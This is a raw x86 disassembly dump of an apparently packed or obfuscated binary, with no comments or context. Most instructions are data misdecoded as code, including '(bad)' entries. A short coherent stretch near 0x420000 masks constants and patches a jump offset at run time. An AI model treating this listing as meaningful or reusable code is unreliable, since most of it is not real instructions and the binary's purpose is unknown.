  41fbdb:	fxrstor [esi-0x5f]
  41fbdf:	and    ebx,DWORD PTR [ebx+0x2370953]
  41fbe5:	mov    ss,WORD PTR [ecx+0x6b]
  41fbe8:	fcom   QWORD PTR [esi-0x40]
  41fbeb:	mov    DWORD PTR [edi],edx
  41fbed:	sbb    DWORD PTR ds:0x59b190f3,ebx
  41fbf3:	inc    ebp
  41fbf4:	scas   eax,DWORD PTR es:[edi]
  41fbf5:	sbb    dh,BYTE PTR [edi+0x250ee34f]
  41fbfb:	sti    
  41fbfc:	jg     0x41fbf9
  41fbfe:	xchg   ecx,eax
  41fbff:	ins    DWORD PTR es:[edi],dx
  41fc00:	sub    esp,DWORD PTR [edi]
  41fc02:	retf   0xfc33
  41fc05:	push   cs
  41fc06:	and    eax,0x911805b4
  41fc0b:	xor    esp,ecx
  41fc0d:	jnp    0x41fc00
  41fc0f:	imul   ecx,ebx,0x64
  41fc12:	dec    eax
  41fc13:	jle    0x41fbb0
  41fc15:	call   0xfd371f66
  41fc1a:	int    0xa7
  41fc1c:	mov    DWORD PTR [esi+ecx*2-0x11],0xc671dbd4
  41fc24:	and    eax,0xcf203350
  41fc29:	jg     0x41fc34
  41fc2b:	mov    dh,0x44
  41fc2d:	ret    
  41fc2e:	loope  0x41fc0f
  41fc30:	sbb    cl,BYTE PTR [ecx]
  41fc32:	ins    DWORD PTR es:[edi],dx
  41fc33:	nop
  41fc34:	mov    dh,BYTE PTR [ecx-0x6d]
  41fc37:	push   ds
  41fc38:	cmp    eax,0xedc9fa7c
  41fc3d:	or     al,0x3f
  41fc3f:	pushf  
  41fc40:	lock mov ds:0xb7fb05c6,al
  41fc46:	xchg   ebx,eax
  41fc47:	xchg   ecx,eax
  41fc48:	jle    0x41fcc2
  41fc4a:	add    ebp,esi
  41fc4c:	std    
  41fc4d:	fs mov DWORD PTR gs:[eax],esp
  41fc51:	add    dh,BYTE PTR [esi-0x531a7175]
  41fc57:	mov    dh,0x95
  41fc59:	(bad)  
  41fc5a:	xchg   edx,eax
  41fc5b:	mov    ecx,DWORD PTR [ebp+0x4f14ee]
  41fc61:	je     0x41fbf9
  41fc63:	pcmpgtd mm4,QWORD PTR [ecx-0x4d]
  41fc67:	add    BYTE PTR [ecx],ah
  41fc69:	leave  
  41fc6a:	outs   dx,DWORD PTR ds:[esi]
  41fc6b:	sbb    DWORD PTR [eax+0x24],eax
  41fc6e:	push   esi
  41fc6f:	push   ebx
  41fc70:	lds    eax,FWORD PTR [ebx+0x5ff5cd01]
  41fc76:	mov    cl,0xb
  41fc78:	adc    eax,DWORD PTR [esi-0x67]
  41fc7b:	push   ds
  41fc7c:	jmp    0x9d8a:0xf339d738
  41fc83:	ins    BYTE PTR es:[edi],dx
  41fc84:	ja     0x41fc71
  41fc86:	das    
  41fc87:	xchg   ebp,eax
  41fc88:	sub    dh,BYTE PTR [ecx+0x46]
  41fc8b:	in     al,dx
  41fc8c:	repnz lods eax,DWORD PTR ds:[si]
  41fc8f:	clc    
  41fc90:	inc    eax
  41fc91:	cmc    
  41fc92:	mov    dh,0x5b
  41fc94:	sbb    eax,0x73cef17d
  41fc99:	jle    0x41fc51
  41fc9b:	inc    ebp
  41fc9c:	mov    edx,0xc0c40175
  41fca1:	pop    esi
  41fca2:	push   0x94dc822f
  41fca7:	loope  0x41fc5f
  41fca9:	xchg   ebp,eax
  41fcaa:	shl    BYTE PTR [esi+0x1b],1
  41fcad:	xor    ebx,esi
  41fcaf:	mov    WORD PTR [ebp+edx*2-0x1ae6d699],gs
  41fcb6:	ret    
  41fcb7:	xchg   ecx,eax
  41fcb8:	pusha  
  41fcb9:	enter  0x81ab,0xf0
  41fcbd:	(bad)  [ecx]
  41fcbf:	inc    edx
  41fcc0:	push   eax
  41fcc1:	div    BYTE PTR [ebx+0x62b766c]
  41fcc7:	ficomp WORD PTR [ecx+ecx*4+0x42e67584]
  41fcce:	mov    bl,0x74
  41fcd0:	adc    DWORD PTR [ebx+0x77],0xffffff85
  41fcd4:	mov    bh,0x50
  41fcd6:	(bad)  
  41fcd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcd8:	ret    0x4b8b
  41fcdb:	ja     0x41fcc1
  41fcdd:	daa    
  41fcde:	add    al,0x1b
  41fce0:	inc    eax
  41fce1:	imul   esi,DWORD PTR [ebx],0xffffff9d
  41fce4:	repnz push edi
  41fce6:	idiv   BYTE PTR [ebp-0x5d9a2141]
  41fcec:	inc    eax
  41fced:	dec    esp
  41fcee:	mov    edx,0xfea45b24
  41fcf3:	ss aaa 
  41fcf5:	mov    ebx,0xab414ace
  41fcfa:	sub    eax,0xc79ee315
  41fcff:	aam    0x6e
  41fd01:	jbe    0x41fd32
  41fd03:	mov    ebx,0x7a858531
  41fd08:	lahf   
  41fd09:	stos   BYTE PTR es:[edi],al
  41fd0a:	xchg   ebp,eax
  41fd0b:	call   0xeecb:0xe889f44e
  41fd12:	arpl   WORD PTR [ebp-0x5d],dx
  41fd15:	cwde   
  41fd16:	lods   eax,DWORD PTR ds:[esi]
  41fd17:	xor    DWORD PTR [ebx+0x68bb2a16],edi
  41fd1d:	cmp    al,0x4
  41fd1f:	pop    edi
  41fd20:	jb     0x41fcf0
  41fd22:	cli    
  41fd23:	inc    esi
  41fd24:	imul   ebx,DWORD PTR [eax+0x477ec844],0xffffffef
  41fd2b:	sahf   
  41fd2c:	jle    0x41fccc
  41fd2e:	inc    esi
  41fd2f:	cmp    esp,DWORD PTR [bx+si]
  41fd32:	stos   BYTE PTR es:[edi],al
  41fd33:	pop    esp
  41fd34:	jecxz  0x41fd1e
  41fd36:	stos   DWORD PTR es:[edi],eax
  41fd37:	xor    eax,0xd241f5cf
  41fd3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd3d:	es xchg edi,eax
  41fd3f:	and    edx,esp
  41fd41:	pop    ds
  41fd42:	fdivr  QWORD PTR [eax+0x5a491455]
  41fd48:	fadd   DWORD PTR [esi+eax*1+0x658f6233]
  41fd4f:	push   ss
  41fd50:	enter  0xfcb4,0x6b
  41fd54:	call   DWORD PTR [ecx+0x4a]
  41fd57:	sbb    DWORD PTR [esi],edi
  41fd59:	dec    edi
  41fd5a:	lahf   
  41fd5b:	icebp  
  41fd5c:	in     eax,0x7f
  41fd5e:	mov    esp,0x8c9e79fa
  41fd63:	cwde   
  41fd64:	repnz mov ds:0x6d57b108,eax
  41fd6a:	out    dx,al
  41fd6b:	arpl   dx,cx
  41fd6d:	mov    cl,0xa1
  41fd6f:	idiv   cl
  41fd71:	jne    0x41fd96
  41fd73:	push   esp
  41fd74:	cmp    edx,ebp
  41fd76:	xor    cl,BYTE PTR [ebp+0x1f]
  41fd79:	mov    ah,BYTE PTR [ebp+ecx*1-0x4]
  41fd7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd7e:	nop
  41fd7f:	sbb    DWORD PTR [eiz*2+0x58217950],0xbb060d79
  41fd8a:	shl    DWORD PTR [esi+ebp*2],cl
  41fd8d:	mov    ds:0x3c36eac2,al
  41fd92:	sti    
  41fd93:	inc    edi
  41fd94:	push   0xffffffa9
  41fd96:	sbb    bl,BYTE PTR [ebx]
  41fd98:	fld    TBYTE PTR [ebx]
  41fd9a:	jp     0x41fdd5
  41fd9c:	add    DWORD PTR [edi],0x1858d9cd
  41fda2:	adc    cl,BYTE PTR [eax+0x5a5ded3f]
  41fda8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fda9:	mov    bl,0xf9
  41fdab:	mov    dh,dl
  41fdad:	and    eax,0xe3a08d97
  41fdb2:	adc    BYTE PTR [esi-0x2b],bh
  41fdb5:	mov    es:0x532c3dd8,eax
  41fdbb:	sbb    ch,ah
  41fdbd:	pusha  
  41fdbe:	cmp    al,0xaa
  41fdc0:	leave  
  41fdc1:	mov    ecx,0xcbb3c396
  41fdc6:	inc    esi
  41fdc7:	cmp    al,0xc
  41fdc9:	mov    esi,0xc8224528
  41fdce:	out    dx,eax
  41fdcf:	or     al,0x8e
  41fdd1:	xlat   BYTE PTR ds:[ebx]
  41fdd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdd3:	sub    al,0x36
  41fdd5:	xlat   BYTE PTR ds:[ebx]
  41fdd6:	int    0x4d
  41fdd8:	ins    BYTE PTR es:[edi],dx
  41fdd9:	lea    edx,[ecx]
  41fddb:	cmp    BYTE PTR [esi-0x1f],0x0
  41fddf:	mov    ss,WORD PTR [edi+0x53853809]
  41fde5:	std    
  41fde6:	push   esp
  41fde7:	push   esi
  41fde8:	pop    esi
  41fde9:	loop   0x41fd9f
  41fdeb:	mov    al,0x21
  41fded:	mov    ecx,0x6892ce51
  41fdf2:	stos   BYTE PTR es:[edi],al
  41fdf3:	push   edi
  41fdf4:	in     eax,0xdf
  41fdf6:	xor    DWORD PTR [ebp+0x2b],edi
  41fdf9:	jb     0x41fdfb
  41fdfb:	lods   al,BYTE PTR ds:[esi]
  41fdfc:	fistp  QWORD PTR [esi+0x54]
  41fdff:	test   eax,0x131648c5
  41fe04:	sti    
  41fe05:	or     DWORD PTR [edx-0x2d959144],ecx
  41fe0b:	stc    
  41fe0c:	xchg   edx,eax
  41fe0d:	mov    esi,0x4adbf2e3
  41fe12:	cmp    al,0xc0
  41fe14:	nop
  41fe15:	inc    ecx
  41fe16:	pop    edi
  41fe17:	or     eax,eax
  41fe19:	xor    al,0xd2
  41fe1b:	push   0x37aede1c
  41fe20:	inc    ebp
  41fe21:	cmp    BYTE PTR [edi],ch
  41fe23:	mov    ds:0x4c868c63,al
  41fe28:	mov    edi,0x39ae9f92
  41fe2d:	lods   al,BYTE PTR ds:[esi]
  41fe2e:	xor    BYTE PTR [edi],dh
  41fe30:	popf   
  41fe31:	pop    ecx
  41fe32:	xchg   esp,eax
  41fe33:	or     bl,dl
  41fe35:	or     bl,BYTE PTR [edi]
  41fe37:	repnz mov eax,0xdd71e0ee
  41fe3d:	cdq    
  41fe3e:	pop    edi
  41fe3f:	adc    eax,0xe9ef1f20
  41fe44:	or     bl,BYTE PTR ds:0x6271a375
  41fe4a:	sbb    al,0xc
  41fe4c:	ss mov eax,0x3db0368b
  41fe52:	jnp    0x41fe2f
  41fe54:	adc    BYTE PTR [edx],al
  41fe56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe57:	popa   
  41fe58:	ficom  WORD PTR [ecx+0x6b]
  41fe5b:	add    ah,BYTE PTR [edi+0x1]
  41fe5e:	xchg   esp,eax
  41fe5f:	das    
  41fe60:	push   ss
  41fe61:	adc    BYTE PTR [edx-0xc],0x79
  41fe65:	out    0x45,al
  41fe67:	ins    DWORD PTR es:[edi],dx
  41fe68:	shr    BYTE PTR [edx-0x7c],cl
  41fe6b:	push   esp
  41fe6c:	cmp    al,0x9e
  41fe6e:	fwait
  41fe6f:	and    al,0xd
  41fe71:	retf   0xb790
  41fe74:	sar    DWORD PTR [esi-0x38d0245b],1
  41fe7a:	push   ebx
  41fe7b:	pop    ds
  41fe7c:	mov    bh,0x6f
  41fe7e:	out    0x8d,al
  41fe80:	(bad)  [eax*1-0x1cc26d3e]
  41fe87:	push   ds
  41fe88:	cli    
  41fe89:	adc    eax,0x5f9cacc3
  41fe8e:	xor    DWORD PTR ds:0x33d76df5,0xffffffc0
  41fe95:	sub    dl,bh
  41fe97:	cld    
  41fe98:	pusha  
  41fe99:	mov    ch,0xb9
  41fe9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe9c:	mov    DWORD PTR [edx+0x2f],ebp
  41fe9f:	adc    BYTE PTR [edx+0x28ba2127],al
  41fea5:	outs   dx,BYTE PTR ds:[esi]
  41fea6:	bound  ecx,QWORD PTR [ebp-0x7675a326]
  41feac:	push   edi
  41fead:	and    DWORD PTR [eax+0x1441abdf],edx
  41feb3:	inc    esp
  41feb4:	icebp  
  41feb5:	lods   eax,DWORD PTR ds:[esi]
  41feb6:	scas   al,BYTE PTR es:[edi]
  41feb7:	add    ebx,DWORD PTR [ebp-0x64a432ba]
  41febd:	test   ah,cl
  41febf:	dec    eax
  41fec0:	retf   
  41fec1:	cmp    ebx,DWORD PTR [esi+0x63b54613]
  41fec7:	int    0x71
  41fec9:	sbb    al,0x41
  41fecb:	xchg   BYTE PTR [edx+eax*8-0x14],ah
  41fecf:	mov    ds:0x13afb468,eax
  41fed4:	out    dx,al
  41fed5:	repz pop ebx
  41fed7:	mov    ecx,0x1ce1139a
  41fedc:	rcl    DWORD PTR [ebp-0x2a],cl
  41fedf:	sub    ecx,DWORD PTR [edi-0x5c]
  41fee2:	mov    edx,0x9ac4c051
  41fee7:	mul    DWORD PTR [ebx+0x557ea668]
  41feed:	es dec edi
  41feef:	push   ecx
  41fef0:	imul   esi,DWORD PTR [ecx-0x47],0x363ff7c8
  41fef7:	mov    ah,BYTE PTR [edi-0x2d]
  41fefa:	xchg   BYTE PTR [ecx-0x78205113],dh
  41ff00:	add    esi,DWORD PTR [edi+0x2c]
  41ff03:	retf   0xca92
  41ff06:	retf   0x58cd
  41ff09:	sbb    esp,0x2b
  41ff0c:	cmc    
  41ff0d:	dec    eax
  41ff0e:	aaa    
  41ff0f:	repz jns 0x41fec4
  41ff12:	int3   
  41ff13:	inc    esi
  41ff14:	add    ebx,DWORD PTR [ebx+eiz*1+0x0]
  41ff18:	push   ecx
  41ff19:	aad    0xc6
  41ff1b:	mov    eax,DWORD PTR [ebx]
  41ff1d:	mov    ebp,0x423224b1
  41ff22:	sbb    dh,BYTE PTR [ebx]
  41ff24:	pop    edx
  41ff25:	dec    esp
  41ff26:	and    ebx,ecx
  41ff28:	xchg   esp,eax
  41ff29:	adc    ebp,DWORD PTR [ebx+0x61]
  41ff2c:	dec    ebx
  41ff2d:	in     al,dx
  41ff2e:	mov    ?,WORD PTR [ecx]
  41ff30:	int    0x1a
  41ff32:	in     eax,dx
  41ff33:	sbb    eax,0x7284e62b
  41ff38:	jno    0x41fefd
  41ff3a:	mov    BYTE PTR [ecx-0x71],cl
  41ff3d:	and    eax,0xdce3d13e
  41ff42:	test   DWORD PTR [edx+0x3d],0x44103b42
  41ff49:	loope  0x41ff61
  41ff4b:	pop    edx
  41ff4c:	mov    ah,0xf3
  41ff4e:	cmc    
  41ff4f:	dec    edx
  41ff50:	push   ebx
  41ff51:	mov    DWORD PTR [edi-0x9231e84],ebp
  41ff57:	cld    
  41ff58:	inc    ecx
  41ff59:	ret    
  41ff5a:	les    edi,FWORD PTR [ebp-0x7296b589]
  41ff60:	ins    DWORD PTR es:[edi],dx
  41ff61:	push   ss
  41ff62:	jmp    0xa4c92f52
  41ff67:	je     0x41feee
  41ff69:	jo     0x41ffd3
  41ff6b:	push   cs
  41ff6c:	repnz aad 0xb3
  41ff6f:	fist   WORD PTR [edi-0xb]
  41ff72:	sbb    ecx,ebp
  41ff74:	retf   
  41ff75:	jb     0x41ff7a
  41ff77:	pop    esi
  41ff78:	repnz std 
  41ff7a:	es mov esi,0xa928b12f
  41ff80:	scas   al,BYTE PTR es:[edi]
  41ff81:	mov    ch,0x54
  41ff83:	mov    ss,WORD PTR [edi]
  41ff85:	xor    al,0xeb
  41ff87:	sub    BYTE PTR ds:0x14b85aca,dl
  41ff8d:	push   ebx
  41ff8e:	mov    dl,0xb9
  41ff90:	nop
  41ff91:	popa   
  41ff92:	icebp  
  41ff93:	std    
  41ff94:	and    BYTE PTR [edx],ah
  41ff96:	jmp    0x41ff5a
  41ff98:	daa    
  41ff99:	adc    cl,BYTE PTR [ebx+0x2468028f]
  41ff9f:	jnp    0x41ff55
  41ffa1:	repz or eax,0x26e54799
  41ffa7:	rol    BYTE PTR [ecx-0x45],0x6e
  41ffab:	gs push esi
  41ffad:	arpl   WORD PTR [edx+0x217a62e4],bp
  41ffb3:	jae    0x41ffbe
  41ffb5:	fiadd  WORD PTR [esi+0x7d7b07b2]
  41ffbb:	adc    al,0xd4
  41ffbd:	jmp    0x7941:0x17830e36
  41ffc4:	jmp    0x41ffd9
  41ffc6:	xchg   ch,dl
  41ffc8:	xchg   ebp,eax
  41ffc9:	and    eax,0xcbc85f0c
  41ffce:	popf   
  41ffcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffd0:	push   0xffffffe5
  41ffd2:	bound  esp,QWORD PTR [eax-0x4b]
  41ffd5:	repnz inc ebx
  41ffd7:	adc    BYTE PTR [eax-0x3f],bh
  41ffda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffdb:	hlt    
  41ffdc:	shl    BYTE PTR [ebx],1
  41ffde:	adc    BYTE PTR [edi-0x56],al
  41ffe1:	push   ebx
  41ffe2:	mov    ds:0x16e85e2f,eax
  41ffe7:	ja     0x420047
  41ffe9:	test   al,0x62
  41ffeb:	push   ecx
  41ffec:	inc    DWORD PTR [ebx]
  41ffee:	jmp    0x5f09:0xfd095b7e
  41fff5:	jno    0x41ffff
  41fff7:	jae    0x420047
  41fff9:	test   BYTE PTR [ebx-0x3ed417b3],cl
  41ffff:	mov    DWORD PTR [ebp-0x18],eax
  420002:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  420009:	mov    eax,DWORD PTR [ebp-0xc]
  42000c:	mov    ecx,DWORD PTR [ebp-0xc]
  42000f:	sub    eax,ecx
  420011:	mov    DWORD PTR [ebp-0xc],eax
  420014:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  42001b:	mov    eax,DWORD PTR [ebp-0x1c]
  42001e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420021:	sub    eax,ecx
  420023:	mov    DWORD PTR [ebp-0x1c],eax
  420026:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  42002d:	mov    eax,DWORD PTR [ebp-0x20]
  420030:	mov    ecx,DWORD PTR [ebp-0x20]
  420033:	sub    eax,ecx
  420035:	mov    DWORD PTR [ebp-0x20],eax
  420038:	mov    eax,DWORD PTR [ebp-0x2c]
  42003b:	mov    ecx,DWORD PTR [ebp-0x20]
  42003e:	mov    esi,0x75108ae
  420043:	xor    eax,esi
  420045:	mov    edi,0x3272f5
  42004a:	add    eax,edi
  42004c:	or     eax,ecx
  42004e:	mov    DWORD PTR [ebp-0x20],eax
  420051:	mov    eax,DWORD PTR [ebp-0x4]
  420054:	mov    ecx,DWORD PTR [ebp-0x4]
  420057:	sub    eax,ecx
  420059:	mov    DWORD PTR [ebp-0x4],eax
  42005c:	or     DWORD PTR [ebp-0x4],0xf89c85be
  420063:	mov    eax,DWORD PTR [ebp-0xc]
  420066:	xor    eax,esi
  420068:	add    eax,edi
  42006a:	push   eax
  42006b:	mov    eax,DWORD PTR [ebp-0x10]
  42006e:	xor    eax,esi
  420070:	add    eax,edi
  420072:	push   eax
  420073:	mov    eax,DWORD PTR [ebp-0x4]
  420076:	xor    eax,esi
  420078:	add    eax,edi
  42007a:	push   eax
  42007b:	lea    eax,[ebp-0x78]
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp-0x2c]
  420082:	push   DWORD PTR [ebp-0x28]
  420085:	call   0x40f76f
  42008a:	test   eax,eax
  42008c:	je     0x4200ba
  420092:	lea    eax,[ebp-0x78]
  420095:	push   eax
  420096:	mov    eax,DWORD PTR [ebp-0x28]
  420099:	xor    eax,esi
  42009b:	add    eax,edi
  42009d:	push   eax
  42009e:	mov    eax,DWORD PTR [ebp-0x24]
  4200a1:	add    eax,0xaa
  4200a6:	push   eax
  4200a7:	mov    eax,DWORD PTR [ebp-0x24]
  4200aa:	mov    eax,DWORD PTR [eax+0x198]
  4200b0:	push   DWORD PTR [eax]
  4200b2:	call   0x4061fa
  4200b7:	mov    DWORD PTR [ebp-0x14],eax
  4200ba:	mov    ecx,DWORD PTR ds:0x42a56a
  4200c0:	lea    eax,[ebp+0x4]
  4200c3:	mov    DWORD PTR [ecx*4+0x42a562],eax
  4200ca:	inc    DWORD PTR ds:0x42a56a
  4200d0:	mov    eax,DWORD PTR [ebp-0x14]
  4200d3:	test   eax,eax
  4200d5:	je     0x4224ce
  4200db:	lea    eax,[ebp-0x8]
  4200de:	mov    DWORD PTR [ebp-0x34],eax
  4200e1:	mov    eax,DWORD PTR [ebp-0x30]
  4200e4:	mov    DWORD PTR [ebp-0x8],eax
  4200e7:	mov    eax,DWORD PTR [ebp-0x8]
  4200ea:	mov    ecx,DWORD PTR [ebp-0x14]
  4200ed:	sub    eax,ecx
  4200ef:	mov    DWORD PTR [ebp-0x8],eax
  4200f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4200f5:	xor    ecx,esi
  4200f7:	mov    eax,0xffcd8d0b
  4200fc:	sub    eax,ecx
  4200fe:	add    DWORD PTR [ebp-0x8],eax
  420101:	mov    eax,DWORD PTR [ebp-0x8]
  420104:	mov    ecx,DWORD PTR [ebp-0x14]
  420107:	mov    DWORD PTR [ecx+0x1],eax
  42010a:	mov    eax,DWORD PTR [ebp-0x14]
  42010d:	jmp    0x42249e
  420112:	adc    ebp,DWORD PTR [ebx]
  420114:	inc    BYTE PTR [eax-0x2a]
  420117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420118:	xchg   ecx,eax
  420119:	or     dh,bh
  42011b:	lahf   
  42011c:	cmp    eax,0x9f095e0a
  420121:	pushw  es
  420123:	mov    dh,0x80
  420125:	or     DWORD PTR [edi],0x5e
  420128:	add    DWORD PTR [ebx+0x1eddcf51],0xffffffda
  42012f:	push   edi
  420130:	jo     0x4200b5
  420132:	jge    0x420115
  420134:	pop    esi
  420135:	dec    esi
  420136:	fs jl  0x420189
  420139:	mov    cl,0x94
  42013b:	outs   dx,DWORD PTR ds:[esi]
  42013c:	pop    edi
  42013d:	mov    esp,0x6e8bdb05
  420142:	je     0x4200f6
  420144:	mov    ebx,0x5bae60b6
  420149:	mov    ds:0x7f86e817,al
  42014e:	pop    ds
  42014f:	rcr    esi,cl
  420151:	mov    al,ds:0x496226d3
  420156:	or     cl,bh
  420158:	jns    0x420199
  42015a:	nop
  42015b:	xor    BYTE PTR [eax+0x55],0x5
  42015f:	jne    0x420191
  420161:	icebp  
  420162:	out    0xa1,eax
  420164:	or     cl,BYTE PTR [ebx]
  420166:	aad    0x7a
  420168:	(bad)
  42016c:	in     eax,dx
  42016d:	sbb    edi,esi
  42016f:	out    0xa9,al
  420171:	push   0x4
  420173:	xor    DWORD PTR [eax],eax
  420175:	push   es
  420176:	sbb    DWORD PTR [ebx+eiz*1+0x1f52e44f],eax
  42017d:	adc    edx,DWORD PTR [ebx-0x35c8bea9]
  420183:	cmp    eax,0x81e8b575
  420188:	ins    BYTE PTR es:[edi],dx
  420189:	push   eax
  42018a:	test   al,0x4d
  42018c:	loop   0x4201dc
  42018e:	shl    BYTE PTR [eax],cl
  420190:	sub    ah,BYTE PTR [edi]
  420192:	add    BYTE PTR [ecx-0x13c8a549],bh
  420198:	jg     0x420161
  42019a:	ror    DWORD PTR [ebx+ebp*8],1
  42019d:	in     eax,dx
  42019e:	mov    BYTE PTR [esi-0x68478611],bh
  4201a4:	jecxz  0x420140
  4201a6:	out    0x8b,eax
  4201a8:	mov    cl,0x45
  4201aa:	push   0x15291945
  4201af:	mov    ebp,0xce7947e9
  4201b4:	imul   ebp,DWORD PTR [eax+ebx*8-0x707cd1a6],0xcb35eb69
  4201bf:	test   eax,0xb617ca5a
  4201c4:	mov    edx,DWORD PTR ds:0xf82ccf7a
  4201ca:	out    0x21,eax
  4201cc:	ror    BYTE PTR [esi],cl
  4201ce:	nop
  4201cf:	or     BYTE PTR [esi],ch
  4201d1:	jg     0x420158
  4201d3:	and    DWORD PTR [edx],edx
  4201d5:	jge    0x420173
  4201d7:	bound  ebp,QWORD PTR [ecx]
  4201d9:	xchg   ecx,eax
  4201da:	jp     0x42018f
  4201dc:	cdq    
  4201dd:	fdiv   DWORD PTR ds:0x8be9e33d
  4201e3:	dec    esi
  4201e4:	jle    0x4201e8
  4201e6:	push   eax
  4201e7:	mov    esi,DWORD PTR [ebp+0x16]
  4201ea:	mov    esp,0x1dfa839a
  4201ef:	iret   
  4201f0:	enter  0x4f6a,0x81
  4201f4:	xor    esp,DWORD PTR [esi+0x16]
  4201f7:	cmp    eax,0x953a0db3
  4201fc:	test   al,0x67
  4201fe:	push   ds
  4201ff:	jne    0x420252
  420201:	adc    BYTE PTR [edi-0x16],bh
  420204:	lods   al,BYTE PTR ds:[esi]
  420205:	or     al,0x88
  420207:	pop    ds
  420208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420209:	add    al,0xe2
  42020b:	outs   dx,BYTE PTR ds:[esi]
  42020c:	scas   eax,DWORD PTR es:[edi]
  42020d:	in     eax,dx
  42020e:	xor    DWORD PTR [eax+0x6d],esi
  420211:	adc    ch,BYTE PTR [ecx+0x2811add2]
  420217:	dec    edi
  420218:	lahf   
  420219:	xchg   ecx,esp
  42021b:	mov    al,0x1e
  42021d:	fdivr  st,st(2)
  42021f:	in     al,dx
  420220:	cli    
  420221:	(bad)  
  420222:	jns    0x420292
  420224:	aam    0x0
  420226:	lods   al,BYTE PTR ds:[esi]
  420227:	push   eax
  420228:	shl    DWORD PTR ds:0xc542ae86,cl
  42022e:	lahf   
  42022f:	scas   al,BYTE PTR es:[edi]
  420230:	fmul   DWORD PTR [ebx]
  420232:	ret    0xd98
  420235:	ret    
  420236:	scas   al,BYTE PTR es:[edi]
  420237:	frstpm(287 only) 
  420239:	mov    DWORD PTR ds:0x241723e3,eax
  42023f:	adc    eax,esi
  420241:	pop    edx
  420242:	fiadd  WORD PTR [ebx-0x5d04b0cf]
  420248:	repz and BYTE PTR [eax],0xb8
  42024c:	lahf   
  42024d:	(bad)  
  42024e:	das    
  42024f:	and    DWORD PTR [esi+esi*2-0x54],ecx
  420253:	or     BYTE PTR [ebp-0x11],ah
  420256:	in     eax,dx
  420257:	mov    ds:0xdebe019,al
  42025c:	lock cmp BYTE PTR [ebp-0x60],bh
  420260:	in     al,0x5d
  420262:	push   eax
  420263:	stos   DWORD PTR es:[edi],eax
  420264:	(bad)  
  420266:	jp     0x42029b
  420268:	js     0x4202d8
  42026a:	fsubr  st(3),st
  42026c:	cld    
  42026d:	cld    
  42026e:	sbb    eax,0xa9d46ed7
  420273:	jnp    0x42022b
  420275:	push   eax
  420276:	je     0x420264
  420278:	add    eax,0x42022006
  42027d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42027e:	and    DWORD PTR [edx-0x2d],0xf
  420282:	lahf   
  420283:	xchg   edi,eax
  420284:	(bad)  
  420285:	repz daa 
  420287:	sti    
  420288:	xor    BYTE PTR [ebp-0x56ba5f96],dh
  42028e:	gs mov ebx,0x832acd4a
  420294:	push   0xd87012b4
  420299:	xchg   edi,eax
  42029a:	out    dx,eax
  42029b:	cmp    eax,0x48a893ea
  4202a0:	cmp    DWORD PTR [ebp+eiz*1-0x306c1017],esp
  4202a7:	sub    eax,0xa2c93a91
  4202ac:	call   0xd932:0xb1b76de8
  4202b3:	mov    al,0x36
  4202b5:	mov    al,BYTE PTR [edi+0x72efa440]
  4202bb:	stos   BYTE PTR es:[edi],al
  4202bc:	adc    al,0x49
  4202be:	mov    esi,0xbc76ba00
  4202c3:	aam    0xb9
  4202c5:	inc    ebp
  4202c6:	and    al,0xf1
  4202c8:	dec    ebx
  4202c9:	pop    ecx
  4202ca:	xor    dl,ch
  4202cc:	rcr    BYTE PTR [esi],1
  4202ce:	xor    edi,DWORD PTR [ecx]
  4202d0:	push   0x715d2681
  4202d5:	bound  eax,QWORD PTR [edi+ebx*4]
  4202d8:	xor    esp,edi
  4202da:	inc    edx
  4202db:	fnstsw WORD PTR [ebx-0x2590341a]
  4202e1:	jnp    0x4202c5
  4202e3:	mov    edx,0x4bc83bc5
  4202e8:	les    bx,DWORD PTR [ebx]
  4202eb:	loopne 0x4202fa
  4202ed:	xchg   ecx,eax
  4202ee:	mov    cl,0x5a
  4202f0:	mov    ah,BYTE PTR [esi]
  4202f2:	adc    al,0x58
  4202f4:	sub    al,0xc6
  4202f6:	clc    
  4202f7:	sbb    DWORD PTR [esi-0xb],edx
  4202fa:	fdivr  QWORD PTR [eax]
  4202fc:	popa   
  4202fd:	mov    ch,0x16
  4202ff:	adc    al,0xbd
  420301:	jecxz  0x4202f6
  420303:	xor    al,0x39
  420305:	cld    
  420306:	mov    ebx,DWORD PTR [edi]
  420308:	icebp  
  420309:	mov    eax,ds:0x753befeb
  42030e:	jb     0x42038b
  420310:	dec    ecx
  420311:	or     BYTE PTR [ebp-0x60ac92c4],al
  420317:	inc    ebx
  420318:	push   es
  420319:	dec    edx
  42031a:	and    BYTE PTR [ebx],ch
  42031c:	and    BYTE PTR fs:[edx],ah
  42031f:	imul   ecx,DWORD PTR [eax-0x56],0x58
  420323:	push   ecx
  420324:	push   cs
  420325:	nop
  420326:	mov    bh,0xc9
  420328:	stc    
  420329:	es pop ds
  42032b:	xchg   ecx,eax
  42032c:	enter  0x3829,0x13
  420330:	inc    eax
  420331:	push   ebp
  420332:	inc    eax
  420333:	int3   
  420334:	out    0xd3,eax
  420336:	sub    bl,BYTE PTR [eax+0x7f]
  420339:	test   BYTE PTR [eax],al
  42033b:	adc    BYTE PTR [ecx+0x5a8ac715],bh
  420341:	bound  ebx,QWORD PTR [esi-0x1d]
  420344:	ret    
  420345:	add    DWORD PTR [esi+0x59],0xf884403
  42034c:	cli    
  42034d:	addr16 jle 0x4203bb
  420350:	xchg   BYTE PTR [ebp-0x4b],cl
  420353:	gs and eax,0x553b6821
  420359:	mov    ah,0x14
  42035b:	pop    ebp
  42035c:	mov    eax,0xe468cdd4
  420361:	xlat   BYTE PTR ds:[ebx]
  420362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
